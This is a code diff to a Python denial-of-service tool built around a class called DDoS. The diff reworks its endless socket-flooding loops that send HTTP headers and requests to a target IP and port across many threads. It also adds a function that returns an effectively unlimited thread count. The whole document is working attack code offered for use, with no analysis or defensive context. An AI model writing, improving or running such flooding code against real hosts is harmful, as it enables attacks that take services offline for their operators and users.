@@ -17,6 +17,9 @@ def UTF16():
 def ASCII():
     enc = 'ascii'
     return enc
+def PERMANENT():
+    thr = 999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
+    return thr
 class DDoS:
     class AdminError(Exception):
         def __init__(self, message="Check if you are running the script as admin."):
@@ -78,12 +81,12 @@ class DDoS:
             raise self.UnknownProtocolError()
         return s
     def sock_conn(self, ip, port):
+        s = self.init(self.protocol)
         while True:
             try:
-                s = self.init(self.protocol)
                 s.connect((ip, port))
                 packet = self.httpheader()
-                s.send(packet.encode(self.enc))
+                s.sendto(packet.encode(self.enc), (ip, port))
             except:
                 pass
     def req_ddos(self):
@@ -94,15 +97,19 @@ class DDoS:
                 time.sleep(0.1)
             except:
                 pass
+    def start_req(self):
+        while True:
+            self.req_ddos()
+    def start_sock(self):
+        while True:
+            self.sock_conn(self.host, self.port)
     def start(self):
-        ip = self.host
-        port = self.port
-        thr = self.thr
-        for i in range(thr):
+        for i in range(self.thr):
             try:
-                dos1 = threading.Thread(target=self.sock_conn, args=(ip, port))
+                dos1 = threading.Thread(target=self.start_sock)
                 dos1.start()
-                dos2 = threading.Thread(target=self.req_ddos)
-                dos2.start()
+                if self.protocol == "tcp":
+                    dos2 = threading.Thread(target=self.start_req)
+                    dos2.start()
             except:
                 pass
